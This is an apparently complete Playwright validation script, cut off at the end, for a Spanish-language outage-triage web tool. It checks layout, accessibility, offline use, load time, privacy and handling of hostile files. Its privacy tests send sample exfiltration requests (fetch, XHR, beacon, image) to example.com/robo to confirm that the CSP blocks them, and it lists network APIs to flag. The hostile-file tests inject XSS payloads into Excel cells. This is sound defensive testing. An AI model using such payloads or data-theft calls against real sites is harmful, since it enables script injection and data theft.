/*
 * Validación de Atiende Primero en un navegador real (Chromium), Fase 4.
 *
 *  a) Tamaños de pantalla: celular, tableta, computadora y proyector.
 *  b) Accesibilidad (axe-core) y uso con teclado.
 *  c) Compatibilidad: sintaxis de JavaScript y respaldo para navegadores sin <dialog>.
 *  d) Sin conexión.
 *  e) Tiempo de carga con red y procesador limitados.
 *  f) Ningún dato sale del dispositivo.
 *  g) Archivos maliciosos o dañados.
 *
 * Uso: npm install (una vez) y luego npm run validacion
 * Escribe los resultados en docs/validacion-resultados.json y capturas en docs/capturas/validacion/.
 */
const path = require("node:path");
const fs = require("node:fs");
const os = require("node:os");
const { chromium } = require("playwright");
const acorn = require("acorn");
const axe = require("axe-core");
const { RAIZ, SITIO, CAPTURAS, XLSX, URL_ARCHIVO, crearRegistro, abrir, iniciarServidor } = require("./apoyo-e2e.js");

const registro = crearRegistro();
const comprobar = registro.comprobar;
const resultados = { fecha: new Date().toISOString(), navegador: null, tamanos: [], accesibilidad: [], tiempos: [], ajustePesos: [], peso: {} };
const CARPETA_CAPTURAS = path.join(CAPTURAS, "validacion");
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "atiende-validacion-"));
const UA_IPHONE = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1";
const UA_ANDROID = "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36";

function guardarXlsx(libro, nombre) {
  const ruta = path.join(tmp, nombre);
  fs.writeFileSync(ruta, XLSX.write(libro, { type: "buffer", bookType: "xlsx" }));
  return ruta;
}
const mediana = (v) => v.slice().sort((a, b) => a - b)[Math.floor(v.length / 2)];

// ---------------------------------------------------------------------------
// a) Tamaños de pantalla
// ---------------------------------------------------------------------------
const TAMANOS = [
  { nombre: "celular-360x640", grupo: "Celular", viewport: { width: 360, height: 640 }, movil: true },
  { nombre: "celular-390x844-iphone", grupo: "Celular", viewport: { width: 390, height: 844 }, movil: true, ua: UA_IPHONE },
  { nombre: "celular-412x915-android", grupo: "Celular", viewport: { width: 412, height: 915 }, movil: true, ua: UA_ANDROID },
  { nombre: "tableta-768x1024", grupo: "Tableta", viewport: { width: 768, height: 1024 }, movil: true },
  { nombre: "tableta-1024x768", grupo: "Tableta", viewport: { width: 1024, height: 768 }, movil: true },
  { nombre: "computadora-1366x768", grupo: "Computadora", viewport: { width: 1366, height: 768 } },
  { nombre: "computadora-1920x1080", grupo: "Computadora", viewport: { width: 1920, height: 1080 } },
  { nombre: "proyector-1280x720", grupo: "Proyector", viewport: { width: 1280, height: 720 } },
  { nombre: "proyector-1024x768-zoom125", grupo: "Proyector", viewport: { width: 819, height: 614 }, escala: 1.25 }
];

async function revisarTamano(navegador, t) {
  const contexto = t.movil ? { isMobile: true, hasTouch: true, userAgent: t.ua } : {};
  if (t.escala) contexto.deviceScaleFactor = t.escala;
  const { contexto: ctx, pagina, problemas } = await abrir(navegador, URL_ARCHIVO, t.viewport, { contexto });
  await pagina.waitForTimeout(300);
  const medir = () => pagina.evaluate(() => {
    const leyenda = document.querySelector(".encabezado .leyenda").getBoundingClientRect();
    const centro = document.elementFromPoint(leyenda.left + leyenda.width / 2, leyenda.top + leyenda.height / 2);
    return {
      desbordeHorizontal: document.documentElement.scrollWidth - window.innerWidth,
      leyendaVisible: leyenda.top >= 0 && leyenda.bottom <= window.innerHeight && leyenda.width > 0 && !!centro && !!centro.closest(".leyenda")
    };
  });
  const inicio = await medir();
  // Textos que no caben en su caja (indicadores, chips de prioridad, celdas de la matriz)
  const encimados = await pagina.evaluate(() => Array.from(document.querySelectorAll(".indicador, .por-prioridad .boton, .celda, .pestana, .acciones .boton"))
    .filter((el) => el.offsetParent !== null && (el.scrollWidth > el.clientWidth + 1))
    .map((el) => (el.className + ": " + el.textContent.trim()).slice(0, 60)));
  // Áreas táctiles menores a 44 px (solo en pantallas táctiles)
  const tactilesChicos = () => pagina.evaluate(() => Array.from(document.querySelectorAll("button, a, select, input, .leaflet-control-zoom a"))
    .map((el) => (el.matches("input[type=checkbox], input[type=radio]") && el.closest("label")) ? el.closest("label") : el)
    .filter((el) => {
      const r = el.getBoundingClientRect();
      if (!r.width || el.closest("[hidden]") || el.closest("dialog:not([open])") || el.offsetParent === null) return false;
      if (r.right <= 0 || r.bottom <= 0 || r.left >= window.innerWidth) return false;   // fuera de la pantalla (p. ej., "Ir al contenido")
      if (el.closest(".leaflet-control-attribution") || el.type === "range" || el.closest(".zona-carga")) return false;
      return Math.min(r.width, r.height) < 43.5;
    }).map((el) => (el.id || el.className || el.tagName) + " " + Math.round(el.getBoundingClientRect().width) + "×" + Math.round(el.getBoundingClientRect().height)));
  let chicos = [];
  if (t.movil) {
    const vistas = t.viewport.width < 1024 ? ["resumen", "mapa", "lista", "pesos"] : [null];
    for (const vista of vistas) {
      if (vista) await pagina.click(`.pestana[data-ir-a="${vista}"]`);
      await pagina.waitForTimeout(150);
      chicos = chicos.concat((await tactilesChicos()).map((c) => (vista ? vista + ": " : "") + c));
    }
    if (t.viewport.width < 1024) await pagina.click('.pestana[data-ir-a="resumen"]');
    chicos = Array.from(new Set(chicos));
  }
  await pagina.screenshot({ path: path.join(CARPETA_CAPTURAS, t.nombre + ".png") });

  // Con el detalle abierto la leyenda sigue visible
  await pagina.locator(".reporte[data-folio]:visible").first().click();
  await pagina.waitForSelector("#detalle:not([hidden])");
  await pagina.waitForTimeout(200);
  const conDetalle = await medir();
  await pagina.screenshot({ path: path.join(CARPETA_CAPTURAS, t.nombre + "-detalle.png") });

  const r = { nombre: t.nombre, grupo: t.grupo, viewport: t.viewport, desbordeHorizontal: inicio.desbordeHorizontal,
    leyendaVisible: inicio.leyendaVisible, leyendaVisibleConDetalle: conDetalle.leyendaVisible, encimados, tactilesChicos: chicos, problemas };
  resultados.tamanos.push(r);
  comprobar(inicio.desbordeHorizontal <= 0, t.nombre + ": sin desplazamiento horizontal", inicio.desbordeHorizontal);
  comprobar(inicio.leyendaVisible && conDetalle.leyendaVisible, t.nombre + ": la leyenda de datos ficticios se ve (también con el detalle abierto)", { inicio: inicio.leyendaVisible, detalle: conDetalle.leyendaVisible });
  comprobar(encimados.length === 0, t.nombre + ": ningún texto se sale de su caja", encimados);
  if (t.movil) comprobar(chicos.length === 0, t.nombre + ": áreas táctiles de 44 px o más", chicos);
  comprobar(problemas.length === 0, t.nombre + ": sin errores", problemas);
  await ctx.close();
}

// ---------------------------------------------------------------------------
// b) Accesibilidad
// ---------------------------------------------------------------------------
async function analizarAxe(pagina, momento, tamano) {
  await pagina.evaluate(axe.source);
  const r = await pagina.evaluate(() => axe.run(document, { resultTypes: ["violations"] }));
  const graves = r.violations.filter((v) => v.impact === "serious" || v.impact === "critical");
  resultados.accesibilidad.push({ tamano, momento, problemas: r.violations.map((v) => ({ id: v.id, impacto: v.impact, descripcion: v.help, elementos: v.nodes.length, ejemplo: v.nodes[0] && v.nodes[0].target.join(" ") })) });
  comprobar(graves.length === 0, `accesibilidad (${tamano}, ${momento}): sin problemas graves`, graves.map((v) => v.id + " ×" + v.nodes.length + " " + (v.nodes[0] && v.nodes[0].target.join(" "))));
}

async function accesibilidad(navegador) {
  for (const [tamano, viewport] of [["celular", { width: 390, height: 844 }], ["computadora", { width: 1366, height: 768 }]]) {
    const { contexto, pagina } = await abrir(navegador, URL_ARCHIVO, viewport, { contexto: { bypassCSP: true } });
    await analizarAxe(pagina, "inicio", tamano);
    if (tamano === "celular") { await pagina.click('.pestana[data-ir-a="lista"]'); await analizarAxe(pagina, "lista", tamano); await pagina.click('.pestana[data-ir-a="pesos"]'); await analizarAxe(pagina, "pesos", tamano); await pagina.click('.pestana[data-ir-a="mapa"]'); await analizarAxe(pagina, "mapa", tamano); }
    await pagina.evaluate(() => App.seleccionar("REP-0200"));
    await pagina.waitForSelector("#detalle:not([hidden])");
    await analizarAxe(pagina, "detalle abierto", tamano);
    await pagina.evaluate(() => App.seleccionar(null));
    await pagina.click("#btn-ayuda");
    await analizarAxe(pagina, "ayuda abierta", tamano);
    await pagina.keyboard.press("Escape");
    await pagina.click("#btn-cargar");
    await analizarAxe(pagina, "carga de archivos abierta", tamano);
    await contexto.close();
  }

  // Uso solo con teclado (computadora)
  const { contexto, pagina, problemas } = await abrir(navegador, URL_ARCHIVO, { width: 1366, height: 768 });
  const tabHasta = async (condicion, maximo = 120) => {
    for (let i = 0; i < maximo; i++) {
      await pagina.keyboard.press("Tab");
      if (await pagina.evaluate(condicion)) return true;
    }
    return false;
  };
  await pagina.evaluate(() => document.activeElement && document.activeElement.blur());
  comprobar(await tabHasta(() => document.activeElement.matches(".celda")), "teclado: se llega a la matriz con Tab");
  await pagina.keyboard.press("Enter");
  comprobar(await pagina.evaluate(() => !!App.estado.filtros.celda), "teclado: Enter en una celda filtra");
  await pagina.evaluate(() => App.limpiarFiltros());
  comprobar(await tabHasta(() => document.activeElement.matches("#lista .reporte")), "teclado: se llega a la lista con Tab");
  await pagina.keyboard.press("Enter");
  const abierto = await pagina.waitForSelector("#detalle:not([hidden])", { timeout: 2000 }).then(() => true).catch(() => false);
  comprobar(abierto && await pagina.evaluate(() => document.activeElement.id === "detalle-titulo"), "teclado: Enter abre el detalle y el foco pasa a su título");
  await pagina.keyboard.press("Escape");
  comprobar(await pagina.evaluate(() => document.getElementById("detalle").hidden && document.activeElement.matches("#lista .reporte")), "teclado: Escape cierra el detalle y regresa el foco a la lista");
  await pagina.focus("#peso-severidad");
  await pagina.keyboard.press("ArrowRight");
  await pagina.waitForTimeout(100);
  comprobar(await pagina.evaluate(() => App.pesosActuales().severidad === 31), "teclado: las flechas mueven un peso");
  await pagina.focus("#btn-ayuda");
  await pagina.keyboard.press("Enter");
  comprobar(await pagina.isVisible("#dlg-ayuda"), "teclado: Enter abre la ayuda");
  await pagina.keyboard.press("Escape");
  comprobar(await pagina.isHidden("#dlg-ayuda"), "teclado: Escape cierra la ayuda");
  comprobar(problemas.length === 0, "teclado: sin errores", problemas);
  await contexto.close();
}

// ---------------------------------------------------------------------------
// c) Compatibilidad
// ---------------------------------------------------------------------------
async function compatibilidad(navegador) {
  const archivos = fs.readdirSync(path.join(SITIO, "js")).filter((f) => f.endsWith(".js"));
  const errores = [];
  for (const f of archivos) {
    try { acorn.parse(fs.readFileSync(path.join(SITIO, "js", f), "utf8"), { ecmaVersion: 2017, sourceType: "script" }); }
    catch (e) { errores.push(f + ": " + e.message); }
  }
  comprobar(errores.length === 0, `sintaxis: los ${archivos.length} archivos de sitio/js usan JavaScript compatible con ES2017 (Safari 11+)`, errores);

  // Navegador sin <dialog> (p. ej., iPhone con iOS < 15.4): los diálogos deben abrir con el respaldo
  const { contexto, pagina, problemas } = await abrir(navegador, URL_ARCHIVO, { width: 390, height: 844 }, {
    antes: () => { delete HTMLDialogElement.prototype.showModal; delete HTMLDialogElement.prototype.close; }
  });
  await pagina.click("#btn-ayuda");
  comprobar(await pagina.isVisible("#dlg-ayuda") && await pagina.evaluate(() => document.getElementById("dlg-ayuda").classList.contains("dialogo-respaldo")), "sin <dialog>: la ayuda se abre con el respaldo");
  await pagina.screenshot({ path: path.join(CARPETA_CAPTURAS, "respaldo-dialogo.png") });
  await pagina.keyboard.press("Escape");
  comprobar(await pagina.isHidden("#dlg-ayuda"), "sin <dialog>: Escape la cierra");
  await pagina.click("#btn-cargar");
  await pagina.setInputFiles("#archivo", path.join(RAIZ, "datos/reportes.xlsx"));
  await pagina.waitForSelector("#resultado-carga .ok");
  await pagina.click('#dlg-cargar [data-cerrar]');
  comprobar(await pagina.isHidden("#dlg-cargar") && await pagina.evaluate(() => !document.body.classList.contains("con-dialogo")), "sin <dialog>: cargar archivos funciona y el diálogo se cierra");
  comprobar(problemas.length === 0, "sin <dialog>: sin errores", problemas);
  await contexto.close();
}

// ---------------------------------------------------------------------------
// d) Sin conexión
// ---------------------------------------------------------------------------
async function usarSinConexion(pagina, etiqueta) {
  await pagina.click("#btn-cargar");
  await pagina.setInputFiles("#archivo", path.join(RAIZ, "datos/reportes.xlsx"));
  const cargo = await pagina.waitForSelector("#resultado-carga .ok", { timeout: 5000 }).then(() => true).catch(() => false);
  comprobar(cargo, etiqueta + ": cargar reportes.xlsx funciona", await pagina.textContent("#resultado-carga"));
  await pagina.click('#dlg-cargar [data-cerrar]');
  await pagina.click('.pestana[data-ir-a="lista"]');
  const descarga = await Promise.all([pagina.waitForEvent("download", { timeout: 5000 }), pagina.click("#btn-exportar")]).then(() => true).catch(() => false);
  comprobar(descarga, etiqueta + ": exportar a Excel funciona");
  await pagina.click('.pestana[data-ir-a="mapa"]');
  await pagina.waitForTimeout(300);
  comprobar(await pagina.evaluate(() => document.querySelectorAll("#mapa .leaflet-interactive, #mapa canvas").length > 0), etiqueta + ": el mapa se dibuja");
  await pagina.click('.pestana[data-ir-a="pesos"]');
  await pagina.evaluate(() => { const c = document.querySelector("#peso-riesgo"); c.value = "80"; c.dispatchEvent(new Event("input", { bubbles: true })); });
  await pagina.waitForFunction(() => App.pesosActuales().riesgo === 80);
  await pagina.evaluate(() => App.seleccionar(App.estado.evaluados[0].reporte.folio));
  comprobar(await pagina.isVisible("#detalle"), etiqueta + ": ajustar pesos y abrir el detalle funciona");
}

async function sinConexion(navegador) {
  // Doble clic (file://) con la red apagada desde el principio
  const ctx1 = await navegador.newContext({ viewport: { width: 390, height: 844 }, acceptDownloads: true, offline: true });
  const p1 = await ctx1.newPage();
  const errores1 = [];
  p1.on("pageerror", (e) => errores1.push(e.message));
  await p1.goto(URL_ARCHIVO);
  await p1.waitForFunction(() => window.App && App.estado.evaluados.length === 200);
  await p1.waitForSelector("#recorrido:not([hidden])", { timeout: 3000 }).catch(() => {});
  if (await p1.isVisible("#recorrido-saltar")) await p1.click("#recorrido-saltar");
  await p1.waitForFunction(() => !!window.XLSX, null, { timeout: 6000 }).catch(() => {});
  comprobar(await p1.evaluate(() => !!window.XLSX), "file:// sin red: la biblioteca de Excel se precarga en segundo plano");
  await usarSinConexion(p1, "file:// sin red");
  comprobar(errores1.length === 0, "file:// sin red: sin errores", errores1);
  await ctx1.close();

  // Publicado (HTTP): se abre con red, luego se pierde la señal
  const srv = await iniciarServidor();
  const { contexto, pagina, problemas } = await abrir(navegador, srv.base + "/", { width: 390, height: 844 }, { origen: srv.base, contexto: { isMobile: true, hasTouch: true } });
  await pagina.waitForFunction(() => !!window.XLSX, null, { timeout: 6000 }).catch(() => {});
  comprobar(await pagina.evaluate(() => !!window.XLSX), "HTTP: la biblioteca de Excel se precarga al terminar de abrir");
  await contexto.setOffline(true);
  await usarSinConexion(pagina, "HTTP, después de perder la señal");
  comprobar(problemas.length === 0, "HTTP sin red: sin errores", problemas);
  await contexto.close();
  await srv.cerrar();
}

// ---------------------------------------------------------------------------
// e) Tiempo de carga
// ---------------------------------------------------------------------------
const PERFILES = [
  { nombre: "4G lento", latencia: 150, bajada: 1.6e6 / 8, subida: 750e3 / 8, cpu: 4 },
  { nombre: "3G rápido", latencia: 300, bajada: 750e3 / 8, subida: 250e3 / 8, cpu: 4 },
  { nombre: "Sin límite", latencia: 0, bajada: -1, subida: -1, cpu: 1 }
];

async function tiempos(navegador) {
  const srv = await iniciarServidor();
  for (const perfil of PERFILES) {
    const corridas = [];
    for (let i = 0; i < 3; i++) {
      const contexto = await navegador.newContext({ viewport: { width: 390, height: 844 }, isMobile: true, hasTouch: true });
      await contexto.addInitScript(() => { try { localStorage.setItem("atiende-primero:recorrido-visto", "1"); } catch (e) {} });
      const pagina = await contexto.newPage();
      const cdp = await contexto.newCDPSession(pagina);
      await cdp.send("Network.enable");
      await cdp.send("Network.setCacheDisabled", { cacheDisabled: true });
      if (perfil.bajada > 0) await cdp.send("Network.emulateNetworkConditions", { offline: false, latency: perfil.latencia, downloadThroughput: perfil.bajada, uploadThroughput: perfil.subida });
      await cdp.send("Emulation.setCPUThrottlingRate", { rate: perfil.cpu });
      const inicio = Date.now();
      await pagina.goto(srv.base + "/");
      await pagina.waitForFunction(() => window.App && App.estado.evaluados.length > 0 && document.querySelector("#indicadores .indicador"), null, { polling: 50, timeout: 60000 });
      const listoMs = Date.now() - inicio;
      const m = await pagina.evaluate(() => {
        const nav = performance.getEntriesByType("navigation")[0];
        const fcp = performance.getEntriesByType("paint").find((p) => p.name === "first-contentful-paint");
        const recursos = performance.getEntriesByType("resource");
        return {
          primerContenido: fcp ? Math.round(fcp.startTime) : null,
          domListo: Math.round(nav.domContentLoadedEventEnd),
          transferido: nav.transferSize + recursos.filter((r) => !/xlsx\.mini/.test(r.name)).reduce((s, r) => s + r.transferSize, 0),
          archivos: recursos.length + 1
        };
      });
      corridas.push(Object.assign(m, { listo: listoMs }));
      await contexto.close();
    }
    const r = {
      perfil: perfil.nombre, cpu: perfil.cpu + "×",
      primerContenidoMs: mediana(corridas.map((c) => c.primerContenido)),
      domListoMs: mediana(corridas.map((c) => c.domListo)),
      listoMs: mediana(corridas.map((c) => c.listo)),
      transferidoKB: Math.round(mediana(corridas.map((c) => c.transferido)) / 1024)
    };
    resultados.tiempos.push(r);
    console.log("  · " + perfil.nombre + ": " + JSON.stringify(r));
    if (perfil.nombre === "4G lento") comprobar(r.listoMs < 3000, "4G lento: la herramienta está lista en menos de 3 s (mediana de 3)", r.listoMs + " ms");
  }
  await srv.cerrar();

  // Ajuste de un peso con 200 y con 5,000 reportes
  for (const [cantidad, cpu] of [[200, 1], [200, 4], [5000, 1], [5000, 4]]) {
    const { contexto, pagina } = await abrir(navegador, URL_ARCHIVO, { width: 1366, height: 768 });
    if (cantidad > 200) {
      await pagina.evaluate((n) => {
        const base = DATOS_EJEMPLO.reportes.Reportes;
        const filas = [base[0]];
        for (let i = 0; i < n; i++) { const f = base[1 + (i % 200)].slice(); f[0] = "SIN-" + i; filas.push(f); }
        App.cargar({ hojasReportes: { Reportes: filas, "Acerca de": DATOS_EJEMPLO.reportes["Acerca de"] }, origen: { tipo: "propio", reportes: "sintético", criterios: "" } });
      }, cantidad);
    }
    const cdp = await contexto.newCDPSession(pagina);
    await cdp.send("Emulation.setCPUThrottlingRate", { rate: cpu });
    const ms = await pagina.evaluate(() => {
      const medidas = [];
      for (let i = 0; i < 5; i++) {
        const t = performance.now();
        App.aplicarPesos({ recurrencia: 10 + i * 10 });
        medidas.push(performance.now() - t);
      }
      return medidas.sort((a, b) => a - b)[2];
    });
    resultados.ajustePesos.push({ reportes: cantidad, cpu: cpu + "×", ms: Math.round(ms) });
    console.log("  · ajuste de un peso con " + cantidad + " reportes, CPU " + cpu + "×: " + Math.round(ms) + " ms");
    if (cantidad === 200 && cpu === 1) comprobar(ms < 100, "mover un peso con 200 reportes responde en menos de 100 ms", Math.round(ms) + " ms");
    await contexto.close();
  }

  // Peso de los archivos
  const tam = (rel) => fs.statSync(path.join(SITIO, rel)).size;
  const zlib = require("node:zlib");
  const gz = (rel) => zlib.gzipSync(fs.readFileSync(path.join(SITIO, rel))).length;
  const primera = ["index.html", "css/estilos.css", "lib/leaflet/leaflet.css", "lib/leaflet/leaflet.js", "datos/municipios.js", "datos/ejemplo.js"]
    .concat(fs.readdirSync(path.join(SITIO, "js")).map((f) => "js/" + f));
  resultados.peso = {
    primeraCargaKB: Math.round(primera.reduce((s, f) => s + tam(f), 0) / 1024),
    primeraCargaComprimidaKB: Math.round(primera.reduce((s, f) => s + gz(f), 0) / 1024),
    sheetjsKB: Math.round(tam("lib/sheetjs/xlsx.mini.min.js") / 1024),
    sheetjsComprimidaKB: Math.round(gz("lib/sheetjs/xlsx.mini.min.js") / 1024)
  };
  console.log("  · peso: " + JSON.stringify(resultados.peso));
}

// ---------------------------------------------------------------------------
// f) Ningún dato sale del dispositivo
// ---------------------------------------------------------------------------
async function privacidad(navegador) {
  const srv = await iniciarServidor();
  const { contexto, pagina, problemas, peticiones } = await abrir(navegador, srv.base + "/", { width: 1366, height: 768 }, { origen: srv.base, saltarRecorrido: false });
  // Flujo completo
  await pagina.waitForSelector("#recorrido:not([hidden])");
  for (let i = 0; i < 5; i++) await pagina.click("#recorrido-siguiente");
  await pagina.click('#matriz .celda[data-impacto="1"][data-urgencia="1"]');
  await pagina.selectOption("#f-tipo", "Sin servicio");
  await pagina.locator("#lista .reporte").first().click();
  await pagina.evaluate(() => { const c = document.querySelector("#peso-usuarios"); c.value = "70"; c.dispatchEvent(new Event("input", { bubbles: true })); });
  await pagina.waitForFunction(() => App.pesosActuales().usuarios === 70);
  await pagina.click("#btn-ayuda");
  await pagina.keyboard.press("Escape");
  await pagina.waitForFunction(() => !!window.XLSX);
  const antesDeCargar = peticiones.length;
  await pagina.click("#btn-cargar");
  await pagina.setInputFiles("#archivo", [path.join(RAIZ, "datos/reportes.xlsx"), path.join(RAIZ, "datos/criterios.xlsx")]);
  await pagina.waitForSelector("#resultado-carga .ok");
  await pagina.click('#dlg-cargar [data-cerrar]');
  await Promise.all([pagina.waitForEvent("download"), pagina.click("#btn-exportar")]);
  comprobar(peticiones.length === antesDeCargar, "cargar dos Excel y exportar no hace ninguna petición de red", peticiones.slice(antesDeCargar));
  comprobar(peticiones.every((u) => u.startsWith(srv.base) || u.startsWith("data:") || u.startsWith("blob:")), "en todo el recorrido solo hubo peticiones al propio sitio (" + peticiones.length + ")", peticiones.filter((u) => !u.startsWith(srv.base)));
  comprobar(srv.solicitudes.every((s) => !/#|pesos=/.test(s.url)), "el servidor nunca recibió los pesos ni el fragmento del enlace", srv.solicitudes.map((s) => s.url));
  comprobar((await contexto.cookies()).length === 0, "no se crea ninguna cookie");
  const claves = await pagina.evaluate(() => Object.keys(localStorage));
  comprobar(claves.every((k) => /^atiende-primero:(recorrido-visto|bienvenida-cerrada)$/.test(k)), "localStorage solo guarda las marcas de recorrido y bienvenida", claves);
  comprobar(problemas.length === 0, "flujo completo: sin errores", problemas);

  // La CSP bloquea cualquier intento de enviar datos fuera. Todo lo que llegue a la red hacia example.com se registra.
  const llegaron = [];
  await contexto.route("https://example.com/**", (ruta) => { llegaron.push(ruta.request().url()); ruta.abort(); });
  const intento = await pagina.evaluate(async () => {
    const violaciones = [];
    document.addEventListener("securitypolicyviolation", (e) => violaciones.push(e.violatedDirective));
    const r = {};
    try { await fetch("https://example.com/robo?d=1"); r.fetch = "salió"; } catch (e) { r.fetch = "bloqueado"; }
    r.xhr = await new Promise((ok) => { const x = new XMLHttpRequest(); x.onerror = () => ok("bloqueado"); x.onload = () => ok("salió"); try { x.open("POST", "https://example.com/robo"); x.send("d"); } catch (e) { ok("bloqueado"); } });
    try { r.beacon = navigator.sendBeacon("https://example.com/robo", "d") ? "aceptado por el navegador" : "bloqueado"; } catch (e) { r.beacon = "bloqueado"; }
    r.imagen = await new Promise((ok) => { const i = new Image(); i.onload = () => ok("salió"); i.onerror = () => ok("bloqueado"); i.src = "https://example.com/robo.png"; });
    await new Promise((ok) => setTimeout(ok, 300));
    r.violaciones = violaciones;
    return r;
  });
  const conexiones = intento.violaciones.filter((v) => v === "connect-src").length;
  comprobar(intento.fetch === "bloqueado" && intento.xhr === "bloqueado" && intento.imagen === "bloqueado" && llegaron.length === 0 &&
    conexiones >= 3 && intento.violaciones.includes("img-src"),
    "la política de seguridad bloquea fetch, XMLHttpRequest, sendBeacon e imágenes hacia otro sitio (nada llegó a la red)", Object.assign({ llegaronALaRed: llegaron }, intento));
  await contexto.close();

  // Capa de calles: si se cancela, no pide nada; si se acepta, solo pide imágenes a OpenStreetMap y sin Referer
  const calles = await abrir(navegador, URL_ARCHIVO, { width: 1366, height: 768 }, { ignorarConsola: /tile\.openstreetmap/ });
  const teselas = [];
  await calles.contexto.route("https://tile.openstreetmap.org/**", (ruta) => {
    teselas.push({ url: ruta.request().url(), referer: ruta.request().headers().referer });
    ruta.fulfill({ status: 200, contentType: "image/png", body: Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=", "base64") });
  });
  calles.pagina.once("dialog", (d) => d.dismiss());
  await calles.pagina.click("#chk-calles");
  await calles.pagina.waitForTimeout(800);
  comprobar(teselas.length === 0 && !(await calles.pagina.isChecked("#chk-calles")), "capa de calles: si se cancela el aviso, no se pide nada");
  calles.pagina.once("dialog", (d) => d.accept());
  await calles.pagina.click("#chk-calles");
  await calles.pagina.waitForTimeout(1500);
  const otras = calles.peticiones.filter((u) => !u.startsWith("file:") && !u.startsWith("data:") && !u.startsWith("https://tile.openstreetmap.org/"));
  comprobar(teselas.length > 0 && otras.length === 0, "capa de calles aceptada: solo pide imágenes a tile.openstreetmap.org", { teselas: teselas.length, otras });
  comprobar(teselas.every((t) => !t.referer), "capa de calles: las peticiones no llevan Referer");
  await calles.contexto.close();

  // Revisión del código: nada que pueda enviar datos
  const prohibido = /\bfetch\s*\(|XMLHttpRequest|sendBeacon|WebSocket|EventSource|navigator\.geolocation|document\.cookie/;
  const hallazgos = [];
  for (const f of fs.readdirSync(path.join(SITIO, "js"))) {
    const texto = fs.readFileSync(path.join(SITIO, "js", f), "utf8");
    if (prohibido.test(texto)) hallazgos.push(f + ": " + texto.match(prohibido)[0]);
    for (const url of texto.match(/https?:\/\/[^\s"'<>)]+/g) || []) {
      if (!/^https:\/\/(leafletjs\.com|tile\.openstreetmap\.org\/\{z\}|www\.openstreetmap\.org\/copyright)/.test(url)) hallazgos.push(f + ": " + url);
    }
  }
  for (const f of ["index.html", "documentacion.html"]) {
    const texto = fs.readFileSync(path.join(SITIO, f), "utf8");
    for (const url of texto.match(/https?:\/\/[^\s"'<>)]+/g) || []) {
      if (!/^https:\/\/(tile\.openstreetmap\.org;?|github\.com\/RolandoGR\/atiende-primero)$/.test(url)) hallazgos.push(f + ": " + url);
    }
  }
  comprobar(hallazgos.length === 0, "revisión del código: sin APIs de red ni direcciones externas (salvo atribuciones, la capa opcional y el repositorio)", hallazgos);
}

// ---------------------------------------------------------------------------
// g) Archivos maliciosos o dañados
// ---------------------------------------------------------------------------
async function archivosHostiles(navegador) {
  const { contexto, pagina, problemas, peticiones } = await abrir(navegador, URL_ARCHIVO, { width: 1366, height: 768 });
  const libro = XLSX.read(fs.readFileSync(path.join(RAIZ, "datos/reportes.xlsx")), { cellDates: true });
  const filas = XLSX.utils.sheet_to_json(libro.Sheets.Reportes, { header: 1, raw: false, dateNF: "yyyy-mm-dd hh:mm" });
  const enc = filas[0];
  const f1 = filas[1];
  f1[enc.indexOf("Municipio")] = '<img src=x onerror="window.__ataque=1">';
  f1[enc.indexOf("Localidad")] = "<script>window.__ataque=2</script>";
  f1[enc.indexOf("Tipo de falla")] = '"><svg onload="window.__ataque=3">';
  f1[enc.indexOf("Cuadrilla")] = "<b onmouseover=window.__ataque=4>x</b>";
  const malo = XLSX.utils.book_new();
  XLSX.utils.book_append_sheet(malo, XLSX.utils.aoa_to_sheet(filas), "Reportes");
  const rutaMalo = guardarXlsx(malo, "reportes-maliciosos.xlsx");

  const crit = XLSX.read(fs.readFileSync(path.join(RAIZ, "datos/criterios.xlsx")));
  const libroCrit = XLSX.utils.book_new();
  for (const nombre of crit.SheetNames) {
    const hoja = XLSX.utils.sheet_to_json(crit.Sheets[nombre], { header: 1 });
    if (nombre === "Reglas") hoja.push(['<img src=x onerror="window.__ataque=5">', "Municipio", "es igual a", '<img src=x onerror="window.__ataque=1">', "Crítica", "Sí"]);
    if (nombre === "Pesos") hoja[1][1] = '<img src=x onerror="window.__ataque=6">';
    XLSX.utils.book_append_sheet(libroCrit, XLSX.utils.aoa_to_sheet(hoja), nombre);
  }
  const rutaCrit = guardarXlsx(libroCrit, "criterios-maliciosos.xlsx");

  await pagina.click("#btn-cargar");
  await pagina.setInputFiles("#archivo", [rutaMalo, rutaCrit]);
  await pagina.waitForSelector("#resultado-carga .ok, #resultado-carga .error");
  await pagina.click('#dlg-cargar [data-cerrar]');
  const folio = filas[1][0];
  await pagina.evaluate((f) => App.seleccionar(f), folio);
  await pagina.waitForSelector("#detalle:not([hidden])");
  await pagina.click("#btn-ayuda");
  await pagina.keyboard.press("Escape");
  await pagina.evaluate(() => App.seleccionar(null));
  await pagina.selectOption("#f-municipio", { index: 1 }).catch(() => {});
  await pagina.locator("#lista .reporte").first().hover();
  await pagina.waitForTimeout(500);
  const ataque = await pagina.evaluate(() => window.__ataque);
  const textoVisible = await pagina.evaluate(() => document.body.innerText);
  comprobar(ataque === undefined, "textos maliciosos en los Excel no ejecutan código", ataque);
  comprobar(textoVisible.includes("<script>window.__ataque=2</script>") && textoVisible.includes("<img src=x"), "los textos maliciosos se muestran como texto");
  comprobar(!peticiones.some((u) => /\/x$/.test(u)), "los textos maliciosos no generan peticiones");

  // Archivos dañados, que no son Excel, o vacíos
  const casos = [];
  const danado = path.join(tmp, "danado.xlsx");
  fs.writeFileSync(danado, Buffer.from("PK\u0003\u0004 esto no es un Excel válido " + "x".repeat(200)));
  casos.push([danado, /no se pudo abrir como Excel|no tiene una hoja/, "un archivo .xlsx dañado"]);
  const texto = path.join(tmp, "notas.txt");
  fs.writeFileSync(texto, "hola");
  casos.push([texto, /no es un archivo \.xlsx/, "un archivo que no es Excel"]);
  const vacio = XLSX.utils.book_new();
  XLSX.utils.book_append_sheet(vacio, XLSX.utils.aoa_to_sheet([[]]), "Reportes");
  casos.push([guardarXlsx(vacio, "vacio.xlsx"), /Faltan columnas|no tiene reportes/, "un Excel con la hoja Reportes vacía"]);
  const soloEncabezados = XLSX.utils.book_new();
  XLSX.utils.book_append_sheet(soloEncabezados, XLSX.utils.aoa_to_sheet([enc]), "Reportes");
